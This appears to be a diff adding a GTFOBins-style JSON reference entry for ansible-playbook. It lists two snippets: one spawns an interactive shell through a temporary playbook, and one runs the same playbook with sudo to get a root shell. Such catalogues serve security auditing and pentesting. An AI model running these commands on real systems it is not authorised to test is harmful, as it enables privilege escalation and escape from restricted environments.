@@ -1,0 +1,16 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "",
+        "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
+      }
+    ]
+  }
+}
